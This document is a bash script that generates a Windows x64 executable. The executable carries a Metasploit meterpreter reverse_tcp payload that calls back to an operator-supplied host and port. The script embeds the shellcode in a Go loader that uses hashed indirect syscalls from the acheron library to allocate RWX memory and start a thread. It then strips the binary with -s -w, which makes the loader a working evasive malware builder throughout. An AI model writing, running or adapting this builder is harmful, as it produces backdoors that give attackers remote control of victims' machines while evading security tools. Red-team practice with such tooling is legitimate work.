#!/bin/bash
set -e
# Verbose ON by default, --quiet/-q to disable, --verbose/-v accepted for compatibility
VERBOSE=true
ARGS=()
for arg in "$@"; do
    case "$arg" in
        --quiet|-q)
            VERBOSE=false
            ;;
        --verbose|-v)
            # Verbose is already on by default, just ignore
            ;;
        *)
            ARGS+=("$arg")
            ;;
    esac
done
set -- "${ARGS[@]}"

LHOST="$1"; LPORT="$2"; TEMPLATE="${3:-none}"
WORKDIR=$(mktemp -d)
OUTFILE="acheron_${LHOST}_${LPORT}.exe"
cd "$WORKDIR"

log() { [ "$VERBOSE" = true ] && echo -e "\e[1;36m[VERBOSE]\e[0m $*"; }
info() { echo -e "\e[1;32m[+]\e[0m $*"; }
err() { echo -e "\e[1;31m[-]\e[0m $*"; }

info "Generating shellcode for $LHOST:$LPORT..."
log "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hex EXITFUNC=thread"
MSF_OUT=$(msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" -f hex EXITFUNC=thread 2>&1)
MSF_EXIT=$?
# Filter out msfvenom warning messages - extract ONLY the pure hex line
SHELLCODE=$(echo "$MSF_OUT" | grep -E '^[0-9a-fA-F]{100,}$' | head -1 | tr -d '\n\r ')
echo "$SHELLCODE" > sc.hex
if [ $MSF_EXIT -ne 0 ] || [ -z "$SHELLCODE" ]; then
    err "msfvenom failed (exit $MSF_EXIT)"
    echo "$MSF_OUT"
    rm -rf "$WORKDIR"; exit 1
fi
log "msfvenom OK - Shellcode: $((${#SHELLCODE}/2)) bytes"

HEX=""
for i in $(seq 0 2 $((${#SHELLCODE}-2))); do
    HEX="${HEX}0x${SHELLCODE:$i:2},"
done
# Remove trailing comma
HEX="${HEX%,}"

log "Writing main.go..."
# Write main.go with the HEX array properly expanded
cat > main.go << GOEOF
package main
import ("unsafe"; "github.com/f1zm0/acheron"; "golang.org/x/sys/windows")
var scHex = []byte{$HEX}
func main() {
    var a,b uintptr; h:=uintptr(0xffffffffffffffff)
    ach,_:=acheron.New(); n:=len(scHex)
    ach.Syscall(ach.HashString("NtAllocateVirtualMemory"),h,uintptr(unsafe.Pointer(&a)),0,uintptr(unsafe.Pointer(&n)),windows.MEM_COMMIT|windows.MEM_RESERVE,windows.PAGE_EXECUTE_READWRITE)
    ach.Syscall(ach.HashString("NtWriteVirtualMemory"),h,a,uintptr(unsafe.Pointer(&scHex[0])),uintptr(n),0)
    ach.Syscall(ach.HashString("NtCreateThreadEx"),uintptr(unsafe.Pointer(&b)),windows.GENERIC_EXECUTE,0,h,a,0,0,0,0,0,0)
    windows.WaitForSingleObject(windows.Handle(b),0xffffffff)
}
GOEOF

log "Go mod init..."
GO_MOD_OUT=$(go mod init tmp 2>&1)
[ "$VERBOSE" = true ] && echo "$GO_MOD_OUT"

log "Downloading dependencies (timeout 120s)..."
timeout 120 go get github.com/f1zm0/acheron golang.org/x/sys/windows 2>&1 | tee /tmp/go_get.log
[ "$VERBOSE" = true ] && cat /tmp/go_get.log | grep -v "go: downloading"

info "Building GOOS=windows GOARCH=amd64..."
log "GOOS=windows GOARCH=amd64 go build -v -ldflags=\"-s -w\" -o $OUTFILE main.go"
log "Target: Windows x64 (amd64)"
log "Strip flags: -s (symbols) -w (DWARF)"
# Run build in background with timeout, capture output in real-time
log "Starting build (timeout 300s)..."
(
    GOOS=windows GOARCH=amd64 timeout 300 go build -v -ldflags="-s -w" -o "$OUTFILE" main.go 2>&1
    echo "BUILD_EXIT:$?" > /tmp/build_exit_code
) | tee /tmp/go_build.log &
BUILD_PID=$!
log "Build started (PID: $BUILD_PID). Waiting..."
wait $BUILD_PID
BUILD_EXIT=$(cat /tmp/build_exit_code 2>/dev/null | cut -d: -f2)
BUILD_OUT=$(cat /tmp/go_build.log 2>/dev/null || echo "timeout or error")
if [ ${BUILD_EXIT:-0} -eq 0 ]; then
    cd - >/dev/null
    mv "$WORKDIR/$OUTFILE" "./$OUTFILE"
    info "Generated: ./$OUTFILE ($(ls -lh ./$OUTFILE | awk '{print $5}'))"
    log "Binary: $(file ./$OUTFILE 2>/dev/null || echo 'PE32+ executable')"
    rm -rf "$WORKDIR"
else
    err "Build failed (exit $BUILD_EXIT)"
    echo "$BUILD_OUT"
    rm -rf "$WORKDIR"
    exit 1
fi
